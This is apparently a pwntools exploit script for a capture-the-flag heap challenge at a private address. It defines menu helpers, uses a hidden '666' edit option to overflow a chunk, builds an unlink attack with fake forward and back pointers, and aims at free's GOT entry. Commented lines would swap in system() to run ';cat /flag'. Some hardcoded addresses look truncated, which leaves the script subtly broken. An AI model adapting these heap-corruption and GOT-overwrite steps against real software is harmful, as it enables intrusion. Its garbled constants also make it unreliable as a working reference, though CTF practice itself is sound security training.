from pwn import *
context.terminal = ['gnome-terminal','-x','sh','-c']

io=remote('172.20.5.2',6027)
io.recvuntil('>>')
io.sendline('2')
libc=ELF('./libc-2.23.so')
def add(idx,size):
    io.recvuntil('choice: ')
    io.sendline('1')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('size:')
    io.sendline(str(size))
def show(idx):
    io.recvuntil('choice: ')
    io.sendline('3')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
def edit(idx,data):
    io.recvuntil('choice: ')
    io.sendline('2')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.send(data)
def free(idx):
    io.recvuntil('choice: ')
    io.sendline('4')
    io.recvuntil('Index: ')
    io.sendline(str(idx))  
def magic(idx,data):
    io.recvuntil('choice: ')
    io.sendline('666')
    io.recvuntil('Index: ')
    io.sendline(str(idx))
    io.recvuntil('Content:')
    io.send(data)

add(3,0x80)
add(4,0x90)
add(0,0x6f)
add(1,0x110)
add(2,0x100)
add(7,0x100)
edit(7,';cat /flag\x00')
edit(0,'b'*(0x6f-0x10))
edit(1,'a'*0xf0+p64(0x21))
magic(0,'a'*(0x69+8-0xf))
magic(0,'0'*0x68+p8(0xb0))
free(3)
free(1)
add(5,0x1b0)
add(6,0xe0)
ptr=0x6021a
edit(5,'a'*0x88+p64(0)+p64(0x91)+p64(ptr-0x18)+p64(ptr-0x10)+'a'*0x70+p64(0x90)+p64(0x90)+'dddddddddd')
free(0)
free_got=0x60201
edit(4,p64(free_got))
show(2)
#libc_base=u64(io.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-libc.sym['free']
#sys=libc_base+libc.sym['system']
#edit(2,p64(sys))
#free(7)

io.interactive()
